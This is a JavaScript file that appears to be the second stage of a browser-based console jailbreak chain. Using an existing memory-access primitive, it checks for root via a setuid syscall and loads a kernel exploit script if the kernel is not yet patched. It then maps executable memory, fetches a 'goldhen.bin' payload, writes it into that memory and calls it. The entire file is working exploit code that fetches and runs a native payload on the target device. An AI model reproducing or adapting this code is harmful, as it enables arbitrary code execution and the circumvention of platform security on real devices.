var p;

var print = function (string) {
  if (typeof string === 'undefined') string = '❌ Unknown error';
  document.getElementById("console").innerHTML += string + "<br>";
  console.log(string);
};

window.stage2 = function () {
  try {
    window.stage2_();
  } catch (e) {
    print("Stage2 error: " + e.message || e);
    fail();
  }
};

window.stage2_ = function () {
  p = window.prim;

  // Test if kernel is already patched
  var test = p.syscall("sys_setuid", 0);

  if (test !== '0') {
    // If not, load kernel exploit
    var sc = document.createElement("script");
    sc.src = "kernel.js";
    sc.onload = () => print("✅ Kernel exploit loaded.");
    sc.onerror = () => {
      print("❌ Failed to load kernel.js");
      fail();
    };
    document.body.appendChild(sc);
    return;
  }

  // Kernel is patched, inject GoldHEN
  const code_addr = new int64(0x26100000, 0x00000009);
  const buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);

  if (buffer.low === 0x26100000 && buffer.hi === 0x00000009) {
    fetch("goldhen.bin")
      .then(resp => {
        if (!resp.ok) throw new Error("HTTP " + resp.status);
        return resp.arrayBuffer();
      })
      .then(buffer => {
        const payload = new Uint8Array(buffer);
        for (let i = 0; i < payload.length; i++) {
          p.write1(code_addr.add32(i), payload[i]);
        }

        p.fcall(code_addr);
        print("✅ GoldHEN injected successfully!");
        allset();
      })
      .catch(err => {
        print("❌ Payload error: " + err.message || err);
        fail();
      });
  } else {
    print("❌ sys_mmap failed or returned wrong address");
    fail();
  }
};

function allset() {
  document.getElementById("loader").style.display = "none";
  document.getElementById("allset").style.display = "block";
}

function fail() {
  document.getElementById("loader").style.display = "none";
  document.getElementById("fail").style.display = "block";
}
